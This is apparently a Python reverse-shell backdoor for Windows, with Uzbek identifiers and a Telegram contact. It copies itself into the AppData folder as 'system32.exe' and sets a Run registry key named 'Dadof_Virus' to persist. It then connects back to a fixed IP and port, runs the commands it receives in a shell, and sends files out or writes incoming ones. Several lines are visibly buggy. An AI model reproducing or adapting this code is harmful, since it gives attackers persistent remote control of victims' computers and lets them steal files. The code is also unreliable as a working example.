import base64
import socket
import subprocess
import os
import sys
import shutil
import time

server_ip = "192.168.238.147"
server_port = 4442 
xabar_sigim =1024

#bog'lanish telegram.me: @uzbanons

def boglanish():

    while True:
        time.sleep(15)
        try :

            klient_soket.connect((server_ip,server_port))
            shell()

        except :
            boglanish()

def mana():

    joylashuv = os.environ["appdata"] + "\\system32.exe"

    if not os.path.exists(joylashuv):
        shutil.copyfile(sys.executable, joylashuv)
        subprocess.call(f'reg add HKCU\\Software\\Microsoft\\CurrentVersion\\Run /v Dadof_Virus /t REG_SZ /d '" +{joylashuv} + "',shell=True')  
    boglanish()
    
    # with open('path\\file.txt', 'a+') as file:
    #     file.write('nimadur')

def shell():

    while True:
        command = klient_soket.recv(xabar_sigim)

        if command == "exit":
            break

        elif command[:2] == "cd" and len(command)>3:
            os.chdir(command[2:])

        elif command[:8] == "download":

            with open(command[9:],'rb') as file:
                klient_soket.send(base64.b64encode(file.read()))

        elif command[6:] == "upload":
            with open(command[7:], 'wb') as fayl:

                fayl_mal = klient_soket.recv(1024*xabar_sigim)
                fayl.write(base64.b64decode(fayl_mal))

        else:
            popen_funksiya = subprocess.Popen(command, shell=True, stdout = subprocess.PIPE,stderr=None)
            natija = popen_funksiya.stdout.read() + popen_funksiya.stderr.read()
 
            klient_soket.send(natija.encode())

    klient_soket.close()

klient_soket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
mana()
boglanish()
shell()











        






        
